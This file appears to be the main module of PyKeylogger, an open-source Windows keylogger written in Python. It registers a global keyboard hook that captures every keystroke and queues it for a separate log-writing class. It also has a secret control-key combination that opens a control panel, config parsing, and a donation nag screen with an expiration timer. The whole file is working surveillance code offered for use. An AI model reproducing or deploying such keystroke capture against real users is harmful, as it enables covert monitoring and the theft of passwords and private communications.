##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2007  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

import pyHook
import time
import pythoncom
import sys
import imp # don't need this anymore?
from optparse import OptionParser
import traceback
from logwriter import LogWriter
import version
#import ConfigParser
from configobj import ConfigObj
from validate import Validator
from controlpanel import PyKeyloggerControlPanel
from supportscreen import SupportScreen, ExpirationScreen
import Tkinter, tkMessageBox
import myutils
import Queue

class KeyLogger:
	''' Captures all keystrokes, puts events in Queue for later processing
	by the LogWriter class
	'''
	def __init__(self): 
		
		self.ParseOptions()
		self.ParseConfigFile()
		self.ParseControlKey()
		self.NagscreenLogic()
		self.q = Queue.Queue(0)
		self.hm = pyHook.HookManager()
		self.hm.KeyDown = self.OnKeyDownEvent
		self.hm.KeyUp = self.OnKeyUpEvent
		
		if self.settings['General']['Hook Keyboard'] == True:
			self.hm.HookKeyboard()
		#if self.options.hookMouse == True:
		#	self.hm.HookMouse()
		
		self.lw = LogWriter(self.settings, self.cmdoptions, self.q) 
		self.panel = False

	def start(self):
		self.lw.start()
		pythoncom.PumpMessages()
	
	def ParseControlKey(self):
		self.controlKeyList = self.settings['General']['Control Key'].split(';')
		self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
		self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
		
	def MaintainControlKeyHash(self, event, updown):
		if updown == 'Down' and event.Key in self.controlKeyHash.keys():
			self.controlKeyHash[event.Key] = True
		if updown == 'Up' and event.Key in self.controlKeyHash.keys():
			self.controlKeyHash[event.Key] = False

	def CheckForControlEvent(self):
		if self.cmdoptions.debug:
			self.lw.PrintDebug("control key status: " + str(self.controlKeyHash))
		if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
			return True
		else:
			return False

	def OnKeyDownEvent(self, event):
		'''This function is the stuff that's supposed to happen when a key is pressed.
		Puts the event in queue, and passes it on.
		Starts control panel if proper key is pressed.
		'''
		#self.lw.WriteToLogFile(event)
		self.q.put(event)
		
		self.MaintainControlKeyHash(event, 'Down')
		
		if self.CheckForControlEvent():
			if not self.panel:
				self.lw.PrintDebug("starting panel")
				self.panel = True
				PyKeyloggerControlPanel(self.cmdoptions, self)

		#~ if event.Key == self.settings['General']['Control Key']:
			#~ if not self.panel:
				#~ self.lw.PrintDebug("starting panel\n")
				#~ self.panel = True
				#~ PyKeyloggerControlPanel(self.cmdoptions, self)
			
		return True
	
	def OnKeyUpEvent(self,event):
		self.MaintainControlKeyHash(event, 'Up')
		return True
	
	def stop(self):
		'''Exit cleanly.
		'''
		self.lw.cancel()
		sys.exit()
	
	def ParseOptions(self):
		'''Read command line options
		'''
		parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
		parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
		parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
		parser.add_option("-v", "--configval", action="store", dest="configval", help="filename of the configuration validation file. [default: %default]")
		
		parser.set_defaults(debug=False, 
							configfile="pykeylogger.ini", 
							configval="pykeylogger.val")
		
		(self.cmdoptions, args) = parser.parse_args()
	
	def ParseConfigFile(self):
		'''Read config file options from .ini file.
		Filename as specified by "--configfile" option, default "pykeylogger.ini".
		Validation file specified by "--configval" option, default "pykeylogger.val".
		
		Give detailed error box and exit if validation on the config file fails.
		'''

		self.settings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)

		# validate the config file
		errortext="Some of your input contains errors. Detailed error output below.\n\n"
		val = Validator()
		valresult = self.settings.validate(val, preserve_errors=True)
		if valresult != True:
			for section in valresult.keys():
				if valresult[section] != True:
					sectionval = valresult[section]
					for key in sectionval.keys():
						if sectionval[key] != True:
							errortext += "Error in item \"" + str(key) + "\": " + str(sectionval[key]) + "\n"
			tkMessageBox.showerror("Errors in config file. Exiting.", errortext)
			sys.exit()
		
	def NagscreenLogic(self):
		'''Figure out whether the nagscreen should be shown, and if so, show it.
		'''
		
		# Congratulations, you have found the nag control. See, that wasn't so hard, was it? :)
		# 
		# While I have deliberately made it easy to stop all this nagging and expiration stuff here,
		# and you are quite entitled to doing just that, I would like to take this final moment 
		# and encourage you once more to support the PyKeylogger project by making a donation. 
		
		# Set this to False to get rid of all nagging.
		NagMe = True
		
		if NagMe == True:
			# first, show the support screen
			root=Tkinter.Tk()
			root.geometry("100x100+200+200")
			warn=SupportScreen(root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35)
			root.destroy()
			del(warn)
			
			#set the timer if first use
			if myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']) == "firstuse":
				self.settings['General']['Usage Time Flag NoDisplay'] = myutils.password_obfuscate(str(time.time()))
				self.settings.write()
			
			# then, see if we have "expired"
			if abs(time.time() - float(myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']))) > 345600: #4 days
				root = Tkinter.Tk()
				root.geometry("100x100+200+200")
				warn=ExpirationScreen(root, title="PyKeylogger Has Expired", rootx_offset=-20, rooty_offset=-35)
				root.destroy()
				del(warn)
				sys.exit()
				
if __name__ == '__main__':
	
	kl = KeyLogger()
	kl.start()
	
	#if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
	